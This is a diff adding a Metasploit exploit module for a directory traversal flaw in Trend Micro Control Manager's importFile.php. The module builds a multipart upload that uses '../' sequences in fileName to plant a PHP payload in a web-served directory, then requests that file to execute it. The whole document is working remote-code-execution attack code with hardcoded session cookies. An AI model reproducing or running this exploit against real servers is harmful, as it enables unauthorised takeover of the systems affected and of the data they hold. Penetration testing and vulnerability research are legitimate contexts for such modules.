@@ -1,0 +1,116 @@
+require 'msf/core'
+require 'msf/core/exploit/php_exe'
+
+class MetasploitModule < Msf::Exploit::Remote
+	Rank = GreatRanking
+
+	include Msf::Exploit::Remote::HttpClient
+	include Msf::Exploit::FileDropper
+	include Msf::Exploit::PhpEXE
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'Trend Micro Control Manager importFile Directory Traversal RCE',
+			'Description'    => %q{
+				This module exploits a directory traversal vulnerability found in Trend Micro
+				Control Manager. The vulnerability is triggered when sending a specially crafted
+				fileName (containing ../'s) parameter to the importFile.php script. This will allow
+				for writing outside of the ImportPolicy directory.
+			},
+			'Author'         => [ 'james fitts' ],
+			'License'        => MSF_LICENSE,
+			'Version'        => '$Revision: $',
+			'References'     =>
+				[
+					[ 'ZDI', '17-060' ],
+					[ 'URL', 'https://success.trendmicro.com/solution/1116624' ]
+				],
+			'Payload'	 =>
+				{
+					'BadChars' => "\x00",
+				},
+			'Platform'       => 'php',
+			'Arch'		 => ARCH_PHP,
+			'Targets'        =>
+				[
+					[ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' } ],
+				],
+			'DefaultTarget' => 0,
+			'DisclosureDate' => 'Feb 07 2017'))
+
+		register_options(
+			[
+				OptString.new('TARGETURI', [true, 'The base path to TMCM', '/webapp']),
+				OptBool.new('SSL', [ true, 'Use SSL', true]),
+				Opt::RPORT(443),
+			], self.class)
+	end
+
+	def exploit
+		require 'securerandom'
+
+		uri =	 target_uri.path
+		uri << '/' if uri[-1,1] != '/'
+
+		boundary = SecureRandom.hex
+		payload_name = "#{rand_text_alpha(5)}.php"
+		print_status("Uploading #{payload_name} to the server...")
+
+		cookies =  "ASP_NET_SessionId=55hjl0burcvx21uslfxjbabs; "
+		cookies << "wf_cookie_path=%2F; WFINFOR=#{rand_text_alpha(10)}; "
+		cookies << "PHPSESSID=fc4o2lg5fpgognc28sjcitugj1; "
+		cookies << "wf_CSRF_token=bd52b54ced23d3dc257984f68c39d34b; "
+		cookies << "un=a8cad04472597b0c1163743109dad8f1; userID=1; "
+		cookies << "LANG=en_US; "
+		cookies << "wids=modTmcmCriticalEvents%2CmodTmcmUserThreatDetection%2CmodTmcmAppStatusSrv%2CmodTmcmTopThreats%2CmodTmcmEndpointThreatDetection%2CmodTmcmCompCompliance%2C; "
+		cookies << "lastID=65; cname=mainConsole; theme=default; lastTab=-1"
+
+		post_body = []
+		post_body << "--#{boundary}\r\n"
+		post_body << "Content-Disposition: form-data; name=\"action\"\r\n\r\n"
+		post_body << "importPolicy\r\n"
+		post_body << "--#{boundary}\r\n"
+		post_body << "Content-Disposition: form-data; name=\"fileSize\"\r\n\r\n"
+		post_body << "2097152\r\n"
+		post_body << "--#{boundary}\r\n"
+		post_body << "Content-Disposition: form-data; name=\"fileName\"\r\n\r\n"
+		post_body << "../../../widget_60_2899/repository/db/sqlite/#{payload_name}\r\n"
+		post_body << "--#{boundary}\r\n"
+		post_body << "Content-Disposition: form-data; name=\"filename\";\r\n"
+		post_body << "filename=\"policy.cmpolicy\"\r\n"
+		post_body << "Content-Type: application/octet-stream\r\n\r\n"
+		post_body << "<?php #{payload.raw} ?>\r\n\r\n"
+		post_body << "--#{boundary}--\r\n"
+
+		res = send_request_cgi({
+			'method'	=> 'POST',
+			'uri'			=>	normalize_uri("#{uri}", "widget", "repository", "widgetPool", "wp1", "widgetBase", "modTMCM", "inc", "importFile.php"),
+			'ctype'		=>	"multipart/form-data; boundary=#{boundary}",
+			'data'		=>	post_body.join,
+			'headers'	=>	{
+				'Cookie'					=>	cookies,
+				'Accept-Encoding'	=>	"gzip;q=1.0,deflate;q=0.6,identity;q=0.3",
+				'Connection'			=>	"close",
+				'Accept'					=>	"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+				'Accept-Language'	=>	"en-US,en;q=0.5",
+			},
+		})
+
+		if res.body =~ /Import Successfully/
+			print_good("#{payload_name} uploaded successfully!")
+			print_status("Attempting to execute payload...")
+
+			res = send_request_cgi({
+				'method'	=>	'GET',
+				'uri'			=>	normalize_uri("#{uri}", "widget_60_2899", "repository", "db", "sqlite", "#{payload_name}"),
+				'headesr'	=>	{
+					'Cookie'	=>	cookies
+				}
+			})
+
+		else
+			print_error("Something went wrong...")
+		end
+
+	end
+end
